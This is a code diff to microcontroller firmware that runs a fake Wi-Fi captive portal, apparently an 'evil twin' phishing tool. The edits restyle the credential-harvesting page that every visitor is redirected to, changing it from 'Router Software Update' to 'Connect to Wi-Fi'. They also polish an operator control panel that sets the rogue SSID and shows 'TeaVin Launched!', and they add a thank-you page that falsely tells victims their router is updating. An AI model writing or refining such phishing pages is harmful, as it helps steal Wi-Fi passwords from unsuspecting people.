@@ -18,38 +18,48 @@ void startCaptivePortal() {
     dnsServer.start(53, "*", WiFi.softAPIP());
 
     server.onNotFound([](AsyncWebServerRequest *request) {
-        AsyncResponseStream *response = request->beginResponseStream("text/html; charset=utf-8");
-        response->print(R"rawliteral(
+    AsyncResponseStream *response = request->beginResponseStream("text/html; charset=utf-8");
+    response->print(R"rawliteral(
 <!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Software Update</title>
+<title>Connect to Wi-Fi</title>
 <style>
-  body { font-family: Arial, sans-serif; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #f0f0f0; }
-  .container { background-color: #fff; padding: 20px; border-radius: 10px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
-  h1, p { font-size: 1.2em; }
-  form { margin-top: 20px; }
-  input[type="password"], button[type="submit"] { font-size: 1.2em; width: 100%; padding: 15px; margin-top: 10px; border-radius: 5px; border: 1px solid #ddd; }
-  button[type="submit"] { background-color: #007bff; color: white; border: none; cursor: pointer; }
-  button[type="submit"]:hover { background-color: #0056b3; }
+  body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 0; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; }
+  .container { background-color: #fff; padding: 20px; border-radius: 10px; box-shadow: 0 4px 8px rgba(0,0,0,0.2); max-width: 400px; width: 100%; animation: scaleUp 0.3s ease-in-out; }
+  h1 { color: #0056b3; text-align: center; }
+  p { text-align: center; font-size: 1.2em; margin: 20px 0; }
+  form { display: flex; flex-direction: column; }
+  input[type="password"], button[type="submit"] { padding: 12px; margin-bottom: 10px; border-radius: 5px; border: 1px solid #ccc; font-size: 1em; }
+  button[type="submit"] { background-color: #4CAF50; color: white; border: none; cursor: pointer; transition: background-color 0.3s ease; }
+  button[type="submit"]:hover { background-color: #45a049; }
+  @keyframes scaleUp {
+    from { transform: scale(0.8); opacity: 0; }
+    to { transform: scale(1); opacity: 1; }
+  }
+  @media (max-width: 400px) {
+    .container { padding: 15px; }
+    h1, p { margin: 15px 0; }
+  }
 </style>
 </head>
 <body>
 <div class="container">
-  <h1>Router Software Update</h1>
-  <p>Enter your WiFi password</p>
+  <h1>Welcome!</h1>
+  <p>Please enter your Wi-Fi password to connect.</p>
   <form action="/submit" method="POST">
-    Password: <input type="password" name="password">
-    <button type="submit">Send</button>
+    Password: <input type="password" name="password" required>
+    <button type="submit">Connect</button>
   </form>
 </div>
 </body>
 </html>
-        )rawliteral");
-        request->send(response);
-    });
+    )rawliteral");
+    request->send(response);
+});
+
 }
 
 void setup() {
@@ -68,34 +78,54 @@ void setup() {
 
     
     server.on("/control", HTTP_GET, [](AsyncWebServerRequest *request) {
-        request->send(200, "text/html; charset=utf-8", R"rawliteral(
+  request->send(200, "text/html; charset=utf-8", R"rawliteral(
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Control Panel</title>
 <style>
-    body { font-family: Arial, sans-serif; padding: 20px; background-color: #f0f0f0; }
-    .container { background-color: #fff; padding: 20px; margin-top: 20px; border-radius: 10px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); }
-    h2 { font-size: 1.5em; }
-    input[type="text"], input[type="submit"] { font-size: 1.2em; width: 100%; padding: 10px; margin-top: 10px; border-radius: 5px; border: 1px solid #ccc; }
-  input[type="submit"] { background-color: #4CAF50; color: white; cursor: pointer; }
+  body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 0; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+  .container { width: 100%; max-width: 600px; background-color: #fff; padding: 20px; margin: 20px; border-radius: 10px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); }
+  h2 { color: #0056b3; text-align: center; margin-bottom: 20px; }
+  form { display: flex; flex-direction: column; }
+  input[type="text"], input[type="submit"] { padding: 12px; margin-bottom: 10px; border-radius: 5px; border: 1px solid #ccc; font-size: 16px; }
+  input[type="submit"] { background-color: #4CAF50; color: white; border: none; cursor: pointer; transition: background-color 0.3s ease; }
   input[type="submit"]:hover { background-color: #45a049; }
+  /* Modal styles */
+  .modal { display: none; position: fixed; z-index: 1; left: 0; top: 0; width: 100%; height: 100%; overflow: auto; background-color: rgba(0,0,0,0.4); }
+  .modal-content { background-color: #fefefe; margin: 15% auto; padding: 20px; border: 1px solid #888; width: 80%; max-width: 300px; border-radius: 10px; text-align: center; }
 </style>
 </head>
 <body>
 <div class="container">
-  <h2>Captive Portal WiFi Setup</h2>
-  <form action="/setssid" method="POST">
+  <h2>WiFi SSID Setup</h2>
+  <form action="/setssid" method="POST" onsubmit="showModal()">
     <input type="text" name="ssid" placeholder="Enter new SSID" required>
     <input type="submit" value="RUN">
   </form>
 </div>
+<!-- Modal -->
+<div id="myModal" class="modal">
+  <div class="modal-content">
+    <p>TeaVin Launched!</p>
+  </div>
+</div>
+<script>
+function showModal() {
+  var modal = document.getElementById("myModal");
+  modal.style.display = "block";
+  setTimeout(function(){ modal.style.display = "none"; }, 3000);
+}
+</script>
 </body>
 </html>
-        )rawliteral");
-    });
+  )rawliteral");
+});
+
+
+
 
     server.on("/setssid", HTTP_POST, [](AsyncWebServerRequest *request) {
         if (request->hasParam("ssid", true)) {
@@ -125,8 +155,40 @@ void setup() {
 
     
     server.on("/thankyou", HTTP_GET, [](AsyncWebServerRequest *request) {
-        request->send(200, "text/html; charset=utf-8", "<!DOCTYPE html><html><head><meta charset='UTF-8'><title>Password Received</title></head><body><h1>Password Received</h1><p>Thank you!</p></body></html>");
-    });
+    String thankYouPage = R"rawliteral(
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Thank You!</title>
+<style>
+  body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 0; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; }
+  .container { background-color: #fff; padding: 20px; border-radius: 10px; box-shadow: 0 4px 8px rgba(0,0,0,0.2); animation: scaleUp 0.3s ease-in-out; }
+  h1 { color: #0056b3; text-align: center; }
+  p { text-align: center; font-size: 1.2em; }
+  @keyframes scaleUp {
+    from { transform: scale(0.8); opacity: 0; }
+    to { transform: scale(1); opacity: 1; }
+  }
+  @media (max-width: 400px) {
+    .container { padding: 15px; }
+    h1 { font-size: 1.4em; }
+    p { font-size: 1em; }
+  }
+</style>
+</head>
+<body>
+<div class="container">
+  <h1>Thank You!</h1>
+  <p>Your password has been received. We are updating your router's software.</p>
+</div>
+</body>
+</html>
+    )rawliteral";
+    request->send(200, "text/html", thankYouPage);
+});
+
 
     
     server.on("/logs", HTTP_GET, [](AsyncWebServerRequest *request) {
@@ -196,5 +258,4 @@ void setup() {
 void loop() {
     dnsServer.processNextRequest(); 
 }
-
 
